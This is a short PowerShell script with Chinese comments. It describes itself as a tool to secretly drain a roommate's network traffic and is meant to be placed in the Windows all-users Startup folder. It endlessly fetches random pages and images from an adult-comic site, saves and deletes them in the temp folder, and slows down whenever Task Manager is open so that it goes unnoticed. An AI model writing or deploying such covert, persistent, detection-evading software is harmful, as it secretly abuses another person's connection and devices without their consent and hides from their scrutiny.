<#
    可放置於: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

    一個避免室友吵我睡覺的腳本, 偷偷消耗其網路流量
#>

# 禁用進度顯示
$ProgressPreference = 'SilentlyContinue'

# 類型字元集
$charset = [char[]]([char]'0'..[char]'9')

# 取得隨機數 ID
function Get-RandomId {
    param (
        [int]$minLength = 1,
        [int]$maxLength = 10
    )

    $length = Get-Random -Minimum $minLength -Maximum ($maxLength + 1)
    return -join ((1..$length) | ForEach-Object { $charset[(Get-Random -Minimum 0 -Maximum $charset.Length)] })
}

# 生成 wnacg 網頁連結, 也可以改成其他類型的
function Get-RandomUrl {
    param ([string]$id = (Get-RandomId))
    return "https://www.wnacg.com/photos-view-id-$($id).html"
}

# 檢查是否開啟任務管理器
function Get-TaskManagerState {
    $taskManagerProcess = Get-Process | Where-Object { $_.Name -eq "taskmgr" }
    return $taskManagerProcess -ne $null
}

function Connection {
    param ([string]$url)
    try {
        $response = Invoke-WebRequest -Uri $url -ErrorAction Stop
        if ($response.StatusCode -eq 200) {
            return $response.Content
        } else {
            return $false
        }
    } catch {
        return $false
    }
}

$temp = $env:Temp
$pattern = 'id="picarea"[^>]*src="([^"]+)"'

while ($true) {
    $Id = Get-RandomId # 獲取隨機值
    $Html = Get-RandomUrl $Id # 生成網頁連結
    $htmlContent = Connection $Html # 嘗試請求網頁
    if ($htmlContent -ne $false) {
        $outputPath = "$temp\$($Id).webp"

        if ($htmlContent -match $pattern) {
            $imageContent = Connection "https:$($matches[1])" # 獲取連結後請求
            if ($imageContent -ne $false) {
                [System.IO.File]::WriteAllBytes($outputPath, $imageContent)
                remove-item $outputPath
            }
        }
    }

    # 簡單的防發現 開啟工作管理員時 降低速度
    $sleep = if (Get-TaskManagerState) { 1500 } else { 10 }
    Start-Sleep -Milliseconds $sleep
}